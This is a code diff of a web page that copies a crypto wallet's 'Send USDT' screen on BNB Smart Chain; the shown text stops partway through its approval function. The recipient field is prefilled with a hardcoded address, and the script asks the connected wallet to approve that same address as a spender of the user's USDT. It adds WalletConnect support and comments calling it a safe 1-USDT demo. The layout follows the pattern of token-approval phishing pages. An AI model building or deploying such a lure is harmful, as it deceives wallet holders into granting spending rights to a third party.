@@ -1,483 +1,1537 @@
-<!DOCTYPE html><html lang="en"><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <meta name="color-scheme" content="light dark">
-  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-  <meta http-equiv="Pragma" content="no-cache">
-  <meta http-equiv="Expires" content="0">
-  <title>Send1 USDT</title>
-  <link rel="stylesheet" href="css/style.css">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/all.min.css">
-  <style>
-    .loading-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(255, 255, 255, 0.9);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 10000;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Send USDT</title>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@4.16.0/dist/web3.min.js"></script>
+
+<style>
+* {
+    box-sizing: border-box;
+    -webkit-tap-highlight-color: transparent;
+}
+
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    min-height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    background: #1b1b1b;
+    color: #fff;
+}
+
+body {
+    min-height: 100vh;
+}
+
+.container {
+    width: 100%;
+    max-width: 600px;
+    margin: 0 auto;
+    padding: 52px 16px 40px;
+}
+
+.title {
+    text-align: center;
+    font-size: 28px;
+    font-weight: 700;
+    margin: 0 0 38px;
+    color: #fff;
+}
+
+.label {
+    display: block;
+    color: #a9a9a9;
+    font-size: 16px;
+    margin-bottom: 9px;
+}
+
+.input-group {
+    width: 100%;
+    height: 48px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border-radius: 12px;
+    padding: 0 14px;
+    background: #1b1b1b;
+    border: 1px solid #404040;
+    margin-bottom: 17px;
+}
+
+.input-group input {
+    flex: 1;
+    min-width: 0;
+    height: 100%;
+    border: 0;
+    outline: 0;
+    background: transparent;
+    color: #fff;
+    font-size: 16px;
+}
+
+.input-group input::placeholder {
+    color: #777;
+}
+
+.text-btn,
+.icon-btn,
+.max-btn {
+    border: 0;
+    background: transparent;
+    color: #01d97e;
+    font-size: 14px;
+    cursor: pointer;
+}
+
+.icon-btn {
+    width: 28px;
+    min-width: 28px;
+    font-size: 16px;
+}
+
+.network-select {
+    width: fit-content;
+    max-width: 75%;
+    min-height: 44px;
+    display: flex;
+    align-items: center;
+    gap: 9px;
+    padding: 10px 13px;
+    margin-bottom: 17px;
+    border: 1px solid #404040;
+    border-radius: 12px;
+    background: #1b1b1b;
+}
+
+.network-icon {
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    overflow: hidden;
+    flex-shrink: 0;
+}
+
+.network-icon img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+.network-text {
+    font-size: 14px;
+    color: #fff;
+    white-space: nowrap;
+}
+
+.network-arrow {
+    color: #888;
+    font-size: 11px;
+}
+
+.estimate {
+    color: #777;
+    font-size: 14px;
+    margin: -5px 0 30px;
+}
+
+.next-btn {
+    width: 100%;
+    height: 64px;
+    border: 0;
+    border-radius: 32px;
+    background: #01d97e;
+    color: #000;
+    font-size: 17px;
+    font-weight: 700;
+    cursor: pointer;
+}
+
+.next-btn:disabled {
+    background: #25653a;
+    color: #fff;
+    opacity: 1;
+    cursor: not-allowed;
+}
+
+.wallet-section {
+    margin-bottom: 25px;
+}
+
+.wallet-btn {
+    width: 100%;
+    height: 50px;
+    border: 1px solid #01d97e;
+    border-radius: 25px;
+    background: transparent;
+    color: #01d97e;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+}
+
+.wallet-btn.connected {
+    background: rgba(1, 217, 126, 0.12);
+}
+
+.wallet-status {
+    margin-top: 9px;
+    color: #888;
+    font-size: 12px;
+    text-align: center;
+    word-break: break-all;
+}
+
+.status {
+    display: none;
+    margin: 15px 0;
+    padding: 13px;
+    border-radius: 10px;
+    font-size: 13px;
+    line-height: 1.4;
+}
+
+.status.show {
+    display: block;
+}
+
+.status.info {
+    background: rgba(255,255,255,.06);
+    color: #ccc;
+}
+
+.status.success {
+    background: rgba(1,217,126,.12);
+    color: #01d97e;
+}
+
+.status.error {
+    background: rgba(255,70,70,.12);
+    color: #ff8585;
+}
+
+.loading-overlay {
+    position: fixed;
+    inset: 0;
+    z-index: 99999;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    background: rgba(0,0,0,.68);
+}
+
+.loading-overlay.show {
+    display: flex;
+}
+
+.loading-box {
+    width: 180px;
+    padding: 25px 20px;
+    border-radius: 16px;
+    background: #242424;
+    text-align: center;
+}
+
+.spinner {
+    width: 32px;
+    height: 32px;
+    margin: 0 auto 13px;
+    border: 3px solid #444;
+    border-top-color: #01d97e;
+    border-radius: 50%;
+    animation: spin .8s linear infinite;
+}
+
+.loading-text {
+    color: #fff;
+    font-size: 14px;
+}
+
+@keyframes spin {
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+@media (prefers-color-scheme: light) {
+    body {
+        background: #fff;
+        color: #000;
     }
 
-    .loading-spinner-container {
-      text-align: center;
+    .container {
+        background: #fff;
     }
 
-    .loading-spinner {
-      width: 60px;
-      height: 60px;
-      border: 4px solid #0000FF;
-      border-top: 4px solid #ffffff;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 20px;
+    .title {
+        color: #000;
     }
 
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    .label {
+        color: #666;
     }
 
-    .loading-text {
-      color: #0000FF;
-      font-size: 16px;
-      font-weight: 600;
-      margin: 0;
-    }
-    /* Dark mode loading spinner styles */
-    @media (prefers-color-scheme: dark) {
-      .loading-overlay {
-        background-color: rgba(0, 0, 0, 0.8) !important;
-      }
-      .loading-spinner {
-        border: 4px solid #01d97e !important;
-        border-top: 4px solid rgba(1, 217, 126, 0.3) !important;
-      }
-      .loading-text {
-        color: #01d97e !important;
-      }
-    }
-    /* Critical styles for Trust Wallet compatibility */
+    .input-group,
     .network-select {
-      display: flex !important;
-      align-items: center !important;
-      background-color: #f5f5f5 !important;
-      border: 1px solid #e0e0e0 !important;
-      border-radius: 12px !important;
-      padding: 10px 12px !important;
-      margin-bottom: 16px !important;
-      gap: 8px !important;
-      min-height: 44px !important;
-      max-height: 44px !important;
-      max-width: 70% !important;
-      width: fit-content !important;
-      box-sizing: border-box !important;
+        background: #fff;
+        border-color: #ddd;
     }
-    .network-icon {
-      width: 20px !important;
-      height: 20px !important;
-      display: flex !important;
-      align-items: center !important;
-      justify-content: center !important;
-      flex-shrink: 0 !important;
-    }
-    .bnb-logo-img {
-      width: 20px !important;
-      height: 20px !important;
-      object-fit: cover !important;
-      display: block !important;
-      border-radius: 50% !important;
-      flex-shrink: 0 !important;
-    }
-    .network-text {
-      flex: 0 1 auto !important;
-      color: #4b5563 !important;
-      font-size: 14px !important;
-      font-weight: 500 !important;
-      line-height: 1.4 !important;
-      white-space: nowrap !important;
-    }
-    .network-arrow {
-      color: #9ca3af !important;
-      font-size: 10px !important;
-      margin-left: auto !important;
-      flex-shrink: 0 !important;
-    }
-    /* Critical button styles for Trust Wallet - Light mode */
-    .text-btn, .icon-btn, .max-btn {
-      color: #0000FF !important;
-    }
-    /* Critical input-group styles for Trust Wallet */
-    .input-group {
-      display: flex !important;
-      align-items: center !important;
-      background-color: #FFFFFF !important;
-      border: 1px solid #d1d5db !important;
-      border-radius: 12px !important;
-      padding: 12px 14px !important;
-      margin-bottom: 16px !important;
-      min-height: 48px !important;
-      max-height: 48px !important;
-      box-sizing: border-box !important;
-      gap: 8px !important;
-      overflow: hidden !important;
-    }
+
     .input-group input {
-      flex: 1 !important;
-      min-width: 0 !important;
-      background: transparent !important;
-      border: none !important;
-      outline: none !important;
-      color: #000000 !important;
-      font-size: 16px !important;
-      font-weight: 500 !important;
-      padding: 0 !important;
-      margin: 0 !important;
-      height: auto !important;
-      line-height: 1.5 !important;
+        color: #000;
     }
-    /* Dark Mode Support - Detects system preference automatically */
-    @media (prefers-color-scheme: dark) {
-      body {
-        background-color: #1b1b1b !important;
-        color: #ffffff !important;
-      }
-      .container {
-        background-color: #1b1b1b !important;
-      }
-      .title {
-        color: #ffffff !important;
-      }
-      .label {
-        color: #d1d5db !important;
-      }
-      .input-group {
-        background-color: #FFFFFF !important;
-        border: 1px solid #e0e0e0 !important;
-      }
-      .input-group input {
-        color: #000000 !important;
-      }
-      .input-group input::placeholder {
-        color: #9ca3af !important;
-      }
-      .text-btn, .icon-btn, .max-btn {
-        color: #01d97e !important;
-      }
-      .unit {
-        color: #4b5563 !important;
-      }
-      .network-select {
-        background-color: #1b1b1b !important;
-        border: 1px solid #404040 !important;
-      }
-      .network-select:hover {
-        background-color: #252525 !important;
-        border-color: #505050 !important;
-      }
-      .network-text {
-        color: #ffffff !important;
-      }
-      .network-arrow {
-        color: #9ca3af !important;
-      }
-      .estimate {
-        color: #9ca3af !important;
-      }
-      .address-input-group {
-        background-color: #1b1b1b !important;
-        border: 1px solid #404040 !important;
-      }
-      .address-input-group input {
-        color: #ffffff !important;
-      }
-      .amount-input-group {
-        background-color: #1b1b1b !important;
-        border: 1px solid #404040 !important;
-      }
-      .amount-input-group input {
-        color: #ffffff !important;
-      }
-      .next-btn {
-        background-color: #01d97e !important;
-        color: #000000 !important;
-      }
-      .next-btn:hover:not(:disabled) {
-        background-color: #01c571 !important;
-      }
-      .next-btn:disabled {
-        background-color: #25653A !important;
-        color: #ffffff !important;
-        cursor: not-allowed !important;
-        opacity: 1 !important;
-      }
-    }
-  </style>
 
+    .network-text {
+        color: #111;
+    }
+
+    .wallet-status {
+        color: #777;
+    }
+}
+</style>
 </head>
-<body>
-  <!-- Loading Spinner Overlay -->
-  <div id="loadingOverlay" class="loading-overlay" style="display: none;">
-    <div class="loading-spinner-container">
-      <div class="loading-spinner"></div>
-      <p class="loading-text">Processing...</p>
-    </div>
-  </div>
 
-  <main class="container">
+<body>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-box">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loadingText">Connecting...</div>
+    </div>
+</div>
+
+<main class="container">
+
     <h1 class="title">Send USDT</h1>
 
-    <label class="label" for="address">Address or Domain Name</label>
-    <div class="input-group address-input-group" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 12px 14px !important; margin-bottom: 16px !important; min-height: 48px !important; max-height: 48px !important; box-sizing: border-box !important; gap: 8px;">
-      <input type="text" id="address" placeholder="Search or Enter" value="0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC" style="flex: 1 !important; min-width: 0 !important; background: transparent !important; border: none !important; outline: none !important; font-size: 16px !important; font-weight: 500 !important; padding: 0 !important; margin: 0 !important; height: auto !important; line-height: 1.5 !important;">
-      <button class="text-btn">Paste</button>
-      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
-      <button class="icon-btn"><i class="fas fa-expand"></i></button>
+    <!-- Wallet -->
+    <div class="wallet-section">
+        <button id="connectWalletBtn" class="wallet-btn">
+            Connect Wallet
+        </button>
+
+        <div id="walletStatus" class="wallet-status">
+            Wallet not connected
+        </div>
     </div>
 
-    <label class="label" for="destinationNetwork">Destination network</label>
-    <div class="network-select" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 10px 12px !important; margin-bottom: 16px !important; cursor: pointer; gap: 8px; -webkit-gap: 8px; max-width: 70% !important; width: fit-content !important; box-sizing: border-box !important; min-height: 44px !important; max-height: 44px !important; height: auto !important;">
-      <div class="network-icon" style="width: 20px !important; height: 20px !important; min-width: 20px !important; display: flex !important; align-items: center !important; justify-content: center !important; flex-shrink: 0 !important; position: relative; margin-right: 8px;">
-        <img src="images/cropped_circle_image.png" alt="BNB Smart Chain" class="bnb-logo-img" style="width: 20px !important; height: 20px !important; max-width: 20px !important; max-height: 20px !important; object-fit: cover !important; display: block !important; border-radius: 50% !important; flex-shrink: 0 !important;">
-      </div>
-      <span class="network-text" style="flex: 0 1 auto !important; font-size: 14px !important; font-weight: 500 !important; line-height: 1.4 !important; white-space: nowrap;">BNB Smart Chain</span>
-      <i class="fas fa-chevron-down network-arrow" style="color: #9ca3af !important; font-size: 10px !important; margin-left: 8px !important; flex-shrink: 0 !important;"></i>
+    <label class="label" for="address">
+        Address or Domain Name
+    </label>
+
+    <div class="input-group">
+        <input
+            type="text"
+            id="address"
+            placeholder="Search or Enter"
+            value="0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC"
+        >
+
+        <button class="text-btn" id="pasteBtn">
+            Paste
+        </button>
+
+        <button class="icon-btn" type="button">
+            👤
+        </button>
+
+        <button class="icon-btn" type="button">
+            ⛶
+        </button>
     </div>
 
-    <label class="label" for="amount">Amount</label>
-    <div class="input-group amount-input-group" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 12px 14px !important; margin-bottom: 16px !important; min-height: 48px !important; max-height: 48px !important; box-sizing: border-box !important; gap: 8px;">
-      <input type="number" id="amount" placeholder="USDT Amount" required="" min="0" step="any" style="flex: 1 !important; min-width: 0 !important; background: transparent !important; border: none !important; outline: none !important; font-size: 16px !important; font-weight: 500 !important; padding: 0 !important; margin: 0 !important; height: auto !important; line-height: 1.5 !important;">
-      <span class="unit">USDT</span>
-      <button class="max-btn">Max</button>
+    <label class="label">
+        Destination network
+    </label>
+
+    <div class="network-select">
+        <div class="network-icon">
+            <img
+                src="images/cropped_circle_image.png"
+                alt="BNB"
+                onerror="this.style.display='none'"
+            >
+        </div>
+
+        <span class="network-text">
+            BNB Smart Chain
+        </span>
+
+        <span class="network-arrow">
+            ▼
+        </span>
     </div>
 
-    <p class="estimate">≈ $0.00</p>
+    <label class="label" for="amount">
+        Amount
+    </label>
 
-    <button type="submit" class="next-btn" id="nextBtn" onclick="handleNextClick()" disabled="">Next</button>
-  </main>
+    <div class="input-group">
+        <input
+            type="number"
+            id="amount"
+            placeholder="USDT Amount"
+            min="0"
+            step="any"
+        >
 
-  <script type="text/javascript" src="js/web3.min.js"></script>
-<script src="js/jquery-3.7.1.min.js"></script>
-<script>
-// Safe 1-USDT demo flow. No automatic connection, no unlimited allowance,
-// and no background wallet/balance reporting.
-const BSC_CHAIN_ID = '0x38';
-const USDT_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';
-const DEMO_SPENDER = '0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC';
-const USDT_DECIMALS = 18; // BSC USDT contract uses 18 decimals.
-const ONE_USDT = '1000000000000000000';
+        <span style="color:#777">
+            USDT
+        </span>
+
+        <button class="max-btn" id="maxBtn" type="button">
+            Max
+        </button>
+    </div>
+
+    <p class="estimate" id="estimate">
+        ≈ $0.00
+    </p>
+
+    <div id="status" class="status"></div>
+
+    <button
+        type="button"
+        class="next-btn"
+        id="nextBtn"
+        disabled
+    >
+        Approve 1 USDT
+    </button>
+
+</main>
+
+<script type="module">
+
+/*
+==========================================================
+WALLETCONNECT CONFIGURATION
+==========================================================
+*/
+
+const WALLETCONNECT_PROJECT_ID =
+    "11e5445365f720d1050dc106ba2e78d6";
+
+
+/*
+==========================================================
+BSC CONFIG
+==========================================================
+*/
+
+const BSC_CHAIN_ID_HEX = "0x38";
+const BSC_CHAIN_ID_DECIMAL = 56;
+
+const BSC_CONFIG = {
+    chainId: BSC_CHAIN_ID_HEX,
+    chainName: "BNB Smart Chain",
+    nativeCurrency: {
+        name: "BNB",
+        symbol: "BNB",
+        decimals: 18
+    },
+    rpcUrls: [
+        "https://bsc-dataseed.binance.org/",
+        "https://bsc-dataseed1.binance.org/"
+    ],
+    blockExplorerUrls: [
+        "https://bscscan.com/"
+    ]
+};
+
+
+/*
+==========================================================
+CONTRACTS
+==========================================================
+*/
+
+/*
+Official BSC USDT contract.
+USDT uses 18 decimals on BSC.
+*/
+
+const USDT_ADDRESS =
+    "0x55d398326f99059ff775485246999027b3197955";
+
+
+/*
+Existing spender address from your original HTML.
+
+For a production application, use a contract you control
+and have independently verified.
+*/
+
+const SPENDER_ADDRESS =
+    "0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC";
+
+
+/*
+==========================================================
+ERC20 ABI
+==========================================================
+*/
 
 const ERC20_ABI = [
-  { constant:true, inputs:[{name:'owner',type:'address'}], name:'balanceOf', outputs:[{name:'',type:'uint256'}], type:'function' },
-  { constant:true, inputs:[{name:'owner',type:'address'},{name:'spender',type:'address'}], name:'allowance', outputs:[{name:'',type:'uint256'}], type:'function' },
-  { constant:false, inputs:[{name:'spender',type:'address'},{name:'amount',type:'uint256'}], name:'approve', outputs:[{name:'',type:'bool'}], type:'function' },
-  { constant:true, inputs:[], name:'decimals', outputs:[{name:'',type:'uint8'}], type:'function' }
+    {
+        constant: true,
+        inputs: [
+            {
+                name: "owner",
+                type: "address"
+            }
+        ],
+        name: "balanceOf",
+        outputs: [
+            {
+                name: "",
+                type: "uint256"
+            }
+        ],
+        stateMutability: "view",
+        type: "function"
+    },
+
+    {
+        constant: true,
+        inputs: [
+            {
+                name: "owner",
+                type: "address"
+            },
+            {
+                name: "spender",
+                type: "address"
+            }
+        ],
+        name: "allowance",
+        outputs: [
+            {
+                name: "",
+                type: "uint256"
+            }
+        ],
+        stateMutability: "view",
+        type: "function"
+    },
+
+    {
+        constant: false,
+        inputs: [
+            {
+                name: "spender",
+                type: "address"
+            },
+            {
+                name: "amount",
+                type: "uint256"
+            }
+        ],
+        name: "approve",
+        outputs: [
+            {
+                name: "",
+                type: "bool"
+            }
+        ],
+        stateMutability: "nonpayable",
+        type: "function"
+    },
+
+    {
+        constant: true,
+        inputs: [],
+        name: "decimals",
+        outputs: [
+            {
+                name: "",
+                type: "uint8"
+            }
+        ],
+        stateMutability: "view",
+        type: "function"
+    },
+
+    {
+        constant: true,
+        inputs: [],
+        name: "symbol",
+        outputs: [
+            {
+                name: "",
+                type: "string"
+            }
+        ],
+        stateMutability: "view",
+        type: "function"
+    }
 ];
 
-let provider = null;
-let web3 = null;
-let userAddress = null;
 
-function showLoading(message = 'Processing...') {
-  const overlay = document.getElementById('loadingOverlay');
-  const text = overlay && overlay.querySelector('.loading-text');
-  if (text) text.textContent = message;
-  if (overlay) overlay.style.display = 'flex';
+/*
+==========================================================
+STATE
+==========================================================
+*/
+
+let walletProvider = null;
+let web3 = null;
+let connectedAccount = null;
+let walletConnectProvider = null;
+
+
+/*
+==========================================================
+ELEMENTS
+==========================================================
+*/
+
+const connectWalletBtn =
+    document.getElementById("connectWalletBtn");
+
+const walletStatus =
+    document.getElementById("walletStatus");
+
+const nextBtn =
+    document.getElementById("nextBtn");
+
+const amountInput =
+    document.getElementById("amount");
+
+const statusEl =
+    document.getElementById("status");
+
+const loadingOverlay =
+    document.getElementById("loadingOverlay");
+
+const loadingText =
+    document.getElementById("loadingText");
+
+const pasteBtn =
+    document.getElementById("pasteBtn");
+
+const maxBtn =
+    document.getElementById("maxBtn");
+
+
+/*
+==========================================================
+UI HELPERS
+==========================================================
+*/
+
+function showLoading(message) {
+    loadingText.textContent = message || "Processing...";
+    loadingOverlay.classList.add("show");
 }
+
 function hideLoading() {
-  const overlay = document.getElementById('loadingOverlay');
-  if (overlay) overlay.style.display = 'none';
+    loadingOverlay.classList.remove("show");
 }
-function setNextEnabled(enabled) {
-  const btn = document.getElementById('nextBtn');
-  if (btn) btn.disabled = !enabled;
+
+function showStatus(message, type = "info") {
+
+    statusEl.textContent = message;
+
+    statusEl.className =
+        "status show " + type;
 }
-function getProvider() {
-  return window.ethereum || window.trustwallet || (window.web3 && window.web3.currentProvider) || null;
+
+function hideStatus() {
+    statusEl.className = "status";
 }
+
+function shortAddress(address) {
+
+    if (!address) {
+        return "";
+    }
+
+    return (
+        address.slice(0, 6) +
+        "..." +
+        address.slice(-4)
+    );
+}
+
+
+/*
+==========================================================
+CHECK EIP-1193 PROVIDER
+==========================================================
+*/
+
+function isValidProvider(provider) {
+
+    return (
+        provider &&
+        typeof provider.request === "function"
+    );
+}
+
+
+/*
+==========================================================
+LOAD WALLETCONNECT PROVIDER
+==========================================================
+*/
+
+async function createWalletConnectProvider() {
+
+    /*
+    Dynamic import avoids requiring npm or a build system.
+    */
+
+    const module = await import(
+        "https://esm.sh/@walletconnect/ethereum-provider@2.21.6"
+    );
+
+    const EthereumProvider =
+        module.EthereumProvider;
+
+    if (!EthereumProvider) {
+
+        throw new Error(
+            "WalletConnect EthereumProvider could not be loaded."
+        );
+    }
+
+    const provider =
+        await EthereumProvider.init({
+
+            projectId:
+                WALLETCONNECT_PROJECT_ID,
+
+            chains: [
+                BSC_CHAIN_ID_DECIMAL
+            ],
+
+            optionalChains: [
+                BSC_CHAIN_ID_DECIMAL
+            ],
+
+            showQrModal: true,
+
+            metadata: {
+                name: "Send USDT Demo",
+                description: "1 USDT approval demo",
+                url: window.location.origin,
+                icons: [
+                    window.location.origin +
+                    "/favicon.ico"
+                ]
+            }
+        });
+
+    return provider;
+}
+
+
+/*
+==========================================================
+GET PROVIDER
+==========================================================
+*/
+
+async function getWalletProvider() {
+
+    /*
+    1. Existing injected provider.
+    */
+
+    if (
+        isValidProvider(window.ethereum)
+    ) {
+
+        return window.ethereum;
+    }
+
+
+    /*
+    2. WalletConnect.
+    */
+
+    if (!walletConnectProvider) {
+
+        walletConnectProvider =
+            await createWalletConnectProvider();
+    }
+
+    if (
+        !isValidProvider(walletConnectProvider)
+    ) {
+
+        throw new Error(
+            "WalletConnect provider.request is unavailable."
+        );
+    }
+
+    return walletConnectProvider;
+}
+
+
+/*
+==========================================================
+CONNECT WALLET
+==========================================================
+*/
 
 async function connectWallet() {
-  provider = getProvider();
-  if (!provider) {
-    alert('No wallet provider found. Open this page inside MetaMask or Trust Wallet browser.');
-    return null;
-  }
 
-  try {
-    // This call is intentionally triggered by the user's Connect button.
-    const accounts = await provider.request({ method:'eth_requestAccounts' });
-    if (!accounts || !accounts.length) throw new Error('No wallet account returned.');
+    try {
 
-    let chainId = await provider.request({ method:'eth_chainId' });
-    if (String(chainId).toLowerCase() !== BSC_CHAIN_ID) {
-      try {
-        await provider.request({
-          method:'wallet_switchEthereumChain',
-          params:[{ chainId:BSC_CHAIN_ID }]
-        });
-      } catch (e) {
-        if (e && e.code === 4902) {
-          await provider.request({
-            method:'wallet_addEthereumChain',
-            params:[{
-              chainId:BSC_CHAIN_ID,
-              chainName:'BNB Smart Chain',
-              nativeCurrency:{ name:'BNB', symbol:'BNB', decimals:18 },
-              rpcUrls:['https://bsc-dataseed.bnbchain.org/','https://bsc-dataseed.binance.org/'],
-              blockExplorerUrls:['https://bscscan.com/']
-            }]
-          });
+        hideStatus();
+
+        showLoading(
+            "Connecting wallet..."
+        );
+
+        const provider =
+            await getWalletProvider();
+
+        walletProvider =
+            provider;
+
+
+        /*
+        WalletConnect provider needs connect().
+        Injected wallets use eth_requestAccounts.
+        */
+
+        if (
+            provider === walletConnectProvider &&
+            typeof provider.connect === "function"
+        ) {
+
+            await provider.connect();
+
         } else {
-          throw e;
+
+            await provider.request({
+                method: "eth_requestAccounts"
+            });
         }
-      }
-    }
 
-    web3 = new Web3(provider);
-    const activeChain = await provider.request({ method:'eth_chainId' });
-    if (String(activeChain).toLowerCase() !== BSC_CHAIN_ID) {
-      throw new Error('Please switch the wallet to BNB Smart Chain.');
-    }
 
-    const refreshed = await provider.request({ method:'eth_accounts' });
-    userAddress = refreshed && refreshed[0] ? refreshed[0] : accounts[0];
-    if (!userAddress) throw new Error('Wallet account is unavailable.');
+        /*
+        Check current network.
+        */
 
-    const short = userAddress.slice(0,6) + '...' + userAddress.slice(-4);
-    const btn = document.getElementById('connectWalletBtn');
-    if (btn) btn.textContent = 'Connected ' + short;
-    setNextEnabled(true);
-    console.log('Wallet connected:', userAddress);
-    console.log('Network: BNB Smart Chain');
-    return userAddress;
-  } catch (error) {
-    console.error('Wallet connection failed:', error);
-    if (error && error.code === 4001) {
-      alert('Wallet connection was rejected.');
-    } else {
-      alert(error && error.message ? error.message : 'Wallet connection failed.');
+        let chainId =
+            await provider.request({
+                method: "eth_chainId"
+            });
+
+
+        chainId =
+            String(chainId).toLowerCase();
+
+
+        /*
+        Switch to BSC.
+        */
+
+        if (
+            chainId !== BSC_CHAIN_ID_HEX
+        ) {
+
+            await switchToBSC(provider);
+        }
+
+
+        /*
+        Re-read account after network switch.
+        */
+
+        const accounts =
+            await provider.request({
+                method: "eth_accounts"
+            });
+
+
+        if (
+            !accounts ||
+            !accounts.length
+        ) {
+
+            throw new Error(
+                "Wallet connected but no account was returned."
+            );
+        }
+
+
+        connectedAccount =
+            accounts[0];
+
+
+        web3 =
+            new Web3(provider);
+
+
+        /*
+        Verify final chain.
+        */
+
+        const finalChain =
+            await provider.request({
+                method: "eth_chainId"
+            });
+
+
+        if (
+            String(finalChain).toLowerCase()
+            !== BSC_CHAIN_ID_HEX
+        ) {
+
+            throw new Error(
+                "Please switch your wallet to BNB Smart Chain."
+            );
+        }
+
+
+        /*
+        Update UI.
+        */
+
+        walletStatus.textContent =
+            shortAddress(connectedAccount);
+
+        connectWalletBtn.textContent =
+            "Wallet Connected";
+
+        connectWalletBtn.classList.add(
+            "connected"
+        );
+
+        nextBtn.disabled = false;
+
+
+        hideLoading();
+
+        showStatus(
+            "Wallet connected to BNB Smart Chain.",
+            "success"
+        );
+
+        console.log(
+            "Connected wallet:",
+            connectedAccount
+        );
+
+        console.log(
+            "Chain ID:",
+            finalChain
+        );
+
+    } catch (error) {
+
+        hideLoading();
+
+        console.error(
+            "Wallet connection error:",
+            error
+        );
+
+        if (
+            error &&
+            error.code === 4001
+        ) {
+
+            showStatus(
+                "Wallet connection was cancelled.",
+                "error"
+            );
+
+        } else {
+
+            showStatus(
+                error.message ||
+                "Wallet connection failed.",
+                "error"
+            );
+        }
     }
-    return null;
-  }
 }
 
-async function ensureConnected() {
-  if (userAddress && web3) return userAddress;
-  return await connectWallet();
+
+/*
+==========================================================
+SWITCH TO BSC
+==========================================================
+*/
+
+async function switchToBSC(provider) {
+
+    try {
+
+        await provider.request({
+
+            method:
+                "wallet_switchEthereumChain",
+
+            params: [
+                {
+                    chainId:
+                        BSC_CHAIN_ID_HEX
+                }
+            ]
+        });
+
+    } catch (error) {
+
+        console.error(
+            "BSC switch error:",
+            error
+        );
+
+
+        /*
+        4902 means the wallet doesn't know
+        this chain yet.
+        */
+
+        if (
+            error &&
+            Number(error.code) === 4902
+        ) {
+
+            try {
+
+                await provider.request({
+
+                    method:
+                        "wallet_addEthereumChain",
+
+                    params: [
+                        BSC_CONFIG
+                    ]
+                });
+
+            } catch (addError) {
+
+                console.error(
+                    "BSC add-chain error:",
+                    addError
+                );
+
+                throw new Error(
+                    "Could not add BNB Smart Chain to this wallet."
+                );
+            }
+
+        } else {
+
+            /*
+            Do NOT automatically call addEthereumChain
+            for arbitrary wallet errors.
+            */
+
+            throw new Error(
+                "Please switch your wallet to BNB Smart Chain."
+            );
+        }
+    }
 }
 
-async function approveOneUSDT(account) {
-  if (!web3) throw new Error('Wallet provider is not initialized.');
-  const contract = new web3.eth.Contract(ERC20_ABI, USDT_ADDRESS);
 
-  const decimals = Number(await contract.methods.decimals().call());
-  if (!Number.isFinite(decimals) || decimals < 0 || decimals > 36) {
-    throw new Error('Unable to read USDT decimals.');
-  }
-  const oneUSDT = web3.utils.toBN(10).pow(web3.utils.toBN(decimals));
+/*
+==========================================================
+USDT CONTRACT
+==========================================================
+*/
 
-  const balance = web3.utils.toBN(await contract.methods.balanceOf(account).call());
-  if (balance.lt(oneUSDT)) {
-    throw new Error('Your wallet needs at least 1 USDT for this demo.');
-  }
+function getUSDTContract() {
 
-  const currentAllowance = web3.utils.toBN(await contract.methods.allowance(account, DEMO_SPENDER).call());
-  if (currentAllowance.gte(oneUSDT)) {
-    alert('1 USDT is already approved for this demo address.');
-    return { alreadyApproved:true };
-  }
+    if (!web3) {
 
-  // IMPORTANT: exactly 1 USDT, never an unlimited allowance.
-  showLoading('Confirm 1 USDT approval in your wallet...');
-  const receipt = await contract.methods.approve(DEMO_SPENDER, oneUSDT.toString()).send({ from:account });
-  console.log('1 USDT approval confirmed:', receipt.transactionHash);
-  return { alreadyApproved:false, txHash:receipt.transactionHash };
+        throw new Error(
+            "Wallet is not connected."
+        );
+    }
+
+    return new web3.eth.Contract(
+        ERC20_ABI,
+        USDT_ADDRESS
+    );
 }
 
-async function TokenApprove() {
-  try {
-    const account = await ensureConnected();
-    if (!account) return;
 
-    const chainId = await provider.request({ method:'eth_chainId' });
-    if (String(chainId).toLowerCase() !== BSC_CHAIN_ID) {
-      throw new Error('Please switch to BNB Smart Chain and try again.');
-    }
+/*
+==========================================================
+APPROVE EXACTLY 1 USDT
+==========================================================
+*/
 
-    showLoading('Checking USDT balance...');
-    const result = await approveOneUSDT(account);
-    hideLoading();
+async function approveOneUSDT() {
 
-    if (result.alreadyApproved) {
-      return;
+    try {
+
+        if (
+            !walletProvider ||
+            !isValidProvider(walletProvider)
+        ) {
+
+            await connectWallet();
+        }
+
+
+        if (!connectedAccount) {
+
+            throw new Error(
+                "Please connect your wallet first."
+            );
+        }
+
+
+        /*
+        Verify BSC before transaction.
+        */
+
+        const chainId =
+            await walletProvider.request({
+                method: "eth_chainId"
+            });
+
+        if (
+            String(chainId).toLowerCase()
+            !== BSC_CHAIN_ID_HEX
+        ) {
+
+            await switchToBSC(
+                walletProvider
+            );
+        }
+
+
+        showLoading(
